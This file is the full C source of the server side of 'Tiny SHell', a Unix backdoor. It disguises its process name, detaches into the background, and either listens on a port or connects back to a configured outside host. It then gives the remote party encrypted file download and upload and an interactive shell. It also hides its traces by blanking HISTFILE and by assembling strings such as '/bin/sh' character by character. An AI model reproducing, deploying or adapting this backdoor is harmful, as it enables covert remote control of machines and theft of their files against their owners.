/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>

/* PTY support requires system-specific #include */

#if defined LINUX || defined OSF
  #include <pty.h>
#else
#if defined FREEBSD
  #include <libutil.h>
#else
#if defined OPENBSD
  #include <util.h>
#else
#if defined SUNOS || defined HPUX
  #include <sys/stropts.h>
#else
#if ! defined CYGWIN && ! defined IRIX
  #error Undefined host system
#endif
#endif
#endif
#endif
#endif

#include "tsh.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];

/* function declaration */

int tshd_get_file( int client );
int tshd_put_file( int client );
int tshd_runshell( int client );

/* program entry point */

int main( int argc,char **argv )
{
    int ret, len, pid, n;

#ifndef CONNECT_BACK_HOST

    int client, server;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;

#else

    int client;
    struct sockaddr_in client_addr;
    struct hostent *client_host;

#endif
    /* overwrite cmdline */
    memset((void *)argv[0], '\0', strlen(argv[0]));
    strcpy(argv[0], FAKE_PROC_NAME);

    /* fork into background */

    pid = fork();

    if( pid < 0 )
    {
        return( 1 );
    }

    if( pid != 0 )
    {
        return( 0 );
    }

    /* create a new session */

    if( setsid() < 0 )
    {
        return( 2 );
    }

    /* close all file descriptors */

    for( n = 0; n < 1024; n++ )
    {
        close( n );
    }

#ifndef CONNECT_BACK_HOST

    /* create a socket */

    server = socket( AF_INET, SOCK_STREAM, 0 );

    if( server < 0 )
    {
        return( 3 );
    }

    /* bind the server on the port the client will connect to */    

    n = 1;

    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                      (void *) &n, sizeof( n ) );

    if( ret < 0 )
    {
        return( 4 );
    }

    server_addr.sin_family      = AF_INET;
    server_addr.sin_port        = htons( SERVER_PORT );
    server_addr.sin_addr.s_addr = INADDR_ANY;

    ret = bind( server, (struct sockaddr *) &server_addr,
                sizeof( server_addr ) );

    if( ret < 0 )
    {
        return( 5 );
    }

    if( listen( server, 5 ) < 0 )
    {
        return( 6 );
    }

    while( 1 )
    {
        /* wait for inboud connections */

        n = sizeof( client_addr );

        client = accept( server, (struct sockaddr *)
                         &client_addr, &n );

        if( client < 0 )
        {
            return( 7 );
        }

#else

    while( 1 )
    {
        sleep( CONNECT_BACK_DELAY );

        /* create a socket */

        client = socket( AF_INET, SOCK_STREAM, 0 );

        if( client < 0 )
        {
            continue;
        }

        /* resolve the client hostname */

        client_host = gethostbyname( CONNECT_BACK_HOST );

        if( client_host == NULL )
        {
            continue;
        }

        memcpy( (void *) &client_addr.sin_addr,
                (void *) client_host->h_addr,
                client_host->h_length );

        client_addr.sin_family = AF_INET;
        client_addr.sin_port   = htons( SERVER_PORT );

        /* try to connect back to the client */

        ret = connect( client, (struct sockaddr *) &client_addr,
                       sizeof( client_addr ) );

        if( ret < 0 )
        {
            close( client );
            continue;
        }

#endif

        /* fork a child to handle the connection */

        pid = fork();

        if( pid < 0 )
        {
            close( client );
            continue;
        }

        if( pid != 0 )
        {
            waitpid( pid, NULL, 0 );
            close( client );
            continue;
        }

#ifndef CONNECT_BACK_HOST

        /* child doesn't need the server socket */

        close( server );

#endif

        /* the child forks and then exits so that the grand-child's
         * father becomes init (this to avoid becoming a zombie) */

        pid = fork();

        if( pid < 0 )
        {
            return( 8 );
        }

        if( pid != 0 )
        {
            return( 9 );
        }

        /* setup the packet encryption layer */

        alarm( 3 );

        ret = pel_server_init( client, secret );

        if( ret != PEL_SUCCESS )
        {
            shutdown( client, 2 );
            return( 10 );
        }

        alarm( 0 );

        /* get the action requested by the client */

        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS || len != 1 )
        {
            shutdown( client, 2 );
            return( 11 );
        }

        /* howdy */

        switch( message[0] )
        {
            case GET_FILE:

                ret = tshd_get_file( client );
                break;

            case PUT_FILE:

                ret = tshd_put_file( client );
                break;

            case RUNSHELL:

                ret = tshd_runshell( client );
                break;

            default:
                
                ret = 12;
                break;
        }

        shutdown( client, 2 );
        return( ret );
    }

    /* not reached */

    return( 13 );
}

int tshd_get_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 14 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    if( fd < 0 )
    {
        return( 15 );
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 ) break;

        if( len < 0 )
        {
            return( 16 );
        }

        ret = pel_send_msg( client, message, len );

        if( ret != PEL_SUCCESS )
        {
            return( 17 );
        }
    }

    return( 18 );
}

int tshd_put_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 19 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        return( 20 );
    }

    /* fetch the data */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            return( 21 );
        }

        if( write( fd, message, len ) != len )
        {
            return( 22 );
        }
    }

    return( 23 );
}

int tshd_runshell( int client )
{
    fd_set rd;
    struct winsize ws;
    char *slave, *temp, *shell;
    int ret, len, pid, pty, tty, n;

    /* request a pseudo-terminal */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
    {
        return( 24 );
    }

    slave = ttyname( tty );

    if( slave == NULL )
    {
        return( 25 );
    }

#else
#if defined IRIX

    slave = _getpty( &pty, O_RDWR, 0622, 0 );

    if( slave == NULL )
    {
        return( 26 );
    }

    tty = open( slave, O_RDWR | O_NOCTTY );

    if( tty < 0 )
    {
        return( 27 );
    }

#else
#if defined CYGWIN || defined SUNOS || defined HPUX

    pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY );

    if( pty < 0 )
    {
        return( 28 );
    }

    if( grantpt( pty ) < 0 )
    {
        return( 29 );
    }

    if( unlockpt( pty ) < 0 )
    {
        return( 30 );
    }

    slave = ptsname( pty );

    if( slave == NULL )
    {
        return( 31 );
    }

    tty = open( slave, O_RDWR | O_NOCTTY );

    if( tty < 0 )
    {
        return( 32 );
    }

#if defined SUNOS || defined HPUX

    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
    {
        return( 33 );
    }

    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
    {
        return( 34 );
    }

#if defined SUNOS

    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
    {
        return( 35 );
    }

#endif
#endif
#endif
#endif
#endif

    /* just in case bash is run, kill the history file */

    temp = (char *) malloc( 10 );

    if( temp == NULL )
    {
        return( 36 );
    }

    temp[0] = 'H'; temp[5] = 'I';
    temp[1] = 'I'; temp[6] = 'L';
    temp[2] = 'S'; temp[7] = 'E';
    temp[3] = 'T'; temp[8] = '=';
    temp[4] = 'F'; temp[9] = '\0';

    putenv( temp );

    /* get the TERM environment variable */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 37 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 6 );

    if( temp == NULL )
    {
        return( 38 );
    }

    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy( temp + 5, (char *) message, len + 1 );

    putenv( temp );

    /* get the window size */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS || len != 4 )
    {
        return( 39 );
    }

    ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
    ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
    {
        return( 40 );
    }

    /* get the system command */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 41 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 1 );

    if( temp == NULL )
    {
        return( 42 );
    }

    strncpy( temp, (char *) message, len + 1 );

    /* fork to spawn a shell */

    pid = fork();

    if( pid < 0 )
    {
        return( 43 );
    }

    if( pid == 0 )
    {
        /* close the client socket and the pty (master side) */

        close( client );
        close( pty );

        /* create a new session */

        if( setsid() < 0 )
        {
            return( 44 );
        }

        /* set controlling tty, to have job control */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
        {
            return( 45 );
        }

#else
#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX

        {
            int fd;

            fd = open( slave, O_RDWR );

            if( fd < 0 )
            {
                return( 46 );
            }

            close( tty );

            tty = fd;
        }

#endif
#endif

        /* tty becomes stdin, stdout, stderr */

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 )
        {
            close( tty );
        }

        /* fire up the shell */

        shell = (char *) malloc( 8 );

        if( shell == NULL )
        {
            return( 47 );
        }

        shell[0] = '/'; shell[4] = '/';
        shell[1] = 'b'; shell[5] = 's';
        shell[2] = 'i'; shell[6] = 'h';
        shell[3] = 'n'; shell[7] = '\0';

        execl( shell, shell + 5, "-c", temp, (char *) 0 );

        /* d0h, this shouldn't happen */

        return( 48 );
    }
    else
    {
        /* tty (slave side) not needed anymore */

        close( tty );

        /* let's forward the data back and forth */

        while( 1 )
        {
            FD_ZERO( &rd );
            FD_SET( client, &rd );
            FD_SET( pty, &rd );

            n = ( pty > client ) ? pty : client;

            if( select( n + 1, &rd, NULL, NULL, NULL ) < 0 )
            {
                return( 49 );
            }

            if( FD_ISSET( client, &rd ) )
            {
                ret = pel_recv_msg( client, message, &len );

                if( ret != PEL_SUCCESS )
                {
                    return( 50 );
                }

                if( write( pty, message, len ) != len )
                {
                    return( 51 );
                }
            }

            if( FD_ISSET( pty, &rd ) )
            {
                len = read( pty, message, BUFSIZE );

                if( len == 0 ) break;

                if( len < 0 )
                {
                    return( 52 );
                }

                ret = pel_send_msg( client, message, len );

                if( ret != PEL_SUCCESS )
                {
                    return( 53 );
                }
            }
        }

        return( 54 );
    }

    /* not reached */

    return( 55 );
}
